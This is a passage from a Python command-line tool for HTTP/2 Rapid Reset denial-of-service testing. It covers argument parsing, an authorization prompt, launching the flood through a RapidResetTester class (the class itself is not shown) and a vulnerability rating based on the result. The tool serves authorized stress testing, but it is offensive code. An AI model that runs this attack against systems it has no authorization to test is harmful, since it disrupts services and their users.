                            help='RST_STREAM error code (default: 8 = CANCEL)')
    
    # Headers customization
    header_group = parser.add_argument_group('Header Customization')
    header_group.add_argument('--custom-headers', nargs='*', metavar='HEADER',
                             help='Custom headers in "Name: Value" format')
    header_group.add_argument('--random-headers', action='store_true',
                             help='Add random headers to requests')
    header_group.add_argument('--header-count', type=int, default=5, metavar='N',
                             help='Number of random headers to add (default: 5)')
    
    # Advanced options
    adv_group = parser.add_argument_group('Advanced Options')
    adv_group.add_argument('--randomize-streams', action='store_true',
                          help='Use random stream IDs instead of sequential')
    adv_group.add_argument('--priority-frames', action='store_true',
                          help='Include priority information in HEADERS frames')
    adv_group.add_argument('--continue-on-error', action='store_true', default=True,
                          help='Continue testing after errors (default: true)')
    adv_group.add_argument('--max-errors', type=int, default=10, metavar='N',
                          help='Maximum errors before stopping (default: 10)')
    
    # Monitoring options
    monitor_group = parser.add_argument_group('Monitoring Options')
    monitor_group.add_argument('--track-latency', action='store_true',
                              help='Track request latency')
    monitor_group.add_argument('--track-responses', action='store_true',
                              help='Track server responses')
    monitor_group.add_argument('--monitor-memory', action='store_true',
                              help='Monitor memory usage')
    
    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument('--output', choices=[f.value for f in OutputFormat],
                             default='console',
                             help='Output format (default: console)')
    output_group.add_argument('--output-file', metavar='FILE',
                             help='Output file name (auto-generated if not specified)')
    output_group.add_argument('--verbose', '-v', action='store_true',
                             help='Enable verbose output')
    output_group.add_argument('--debug', action='store_true',
                             help='Enable debug logging')
    output_group.add_argument('--log-file', metavar='FILE',
                             help='Log to file')
    output_group.add_argument('--no-banner', action='store_true',
                             help='Suppress banner output')
    
    # Parse arguments
    args = parser.parse_args()
    
    # Validate arguments
    if args.connections < 1 or args.connections > 100:
        print("Error: Number of connections must be between 1 and 100")
        sys.exit(1)
    
    if args.requests < 1 or args.requests > 10000:
        print("Error: Number of requests must be between 1 and 10000")
        sys.exit(1)
    
    # Setup
    if not args.no_banner:
        print_banner()
    
    setup_logging(args.verbose, args.debug, args.log_file)
    
    # Safety warning
    print("⚠️  WARNING: This tool performs a Denial of Service attack!")
    print("⚠️  Only use against systems you own or have explicit permission to test.")
    print("⚠️  Unauthorized use may be illegal and could cause service disruption.")
    
    response = input("\nDo you have authorization to test the target? (yes/no): ")
    if response.lower() not in ['yes', 'y']:
        print("Test aborted. Only use this tool with proper authorization.")
        sys.exit(0)
    
    try:
        # Create configuration
        config = create_config_from_args(args)
        
        # Create and run tester
        tester = RapidResetTester(args.url, config)
        
        results = await tester.run_test()
        
        # Output results
        if args.output == 'console':
            print_results(results, args.verbose)
        else:
            output_format = OutputFormat(args.output)
            save_results(results, output_format, args.output_file)
            
            # Also print summary to console
            print_results(results, False)
        
        # Assessment
        success_rate = results['test_summary']['success_rate']
        if success_rate > 80:
            print("\n🔴 HIGH RISK: Target appears vulnerable to Rapid Reset attacks")
            print("   Consider updating HTTP/2 implementation and enabling rate limiting")
        elif success_rate > 50:
            print("\n🟡 MEDIUM RISK: Target may be partially vulnerable")
            print("   Review HTTP/2 configuration and monitoring")
        else:
            print("\n🟢 LOW RISK: Target appears to have mitigations in place")
            print("   Continue monitoring and keep systems updated")
        
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Test failed: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    asyncio.run(main())
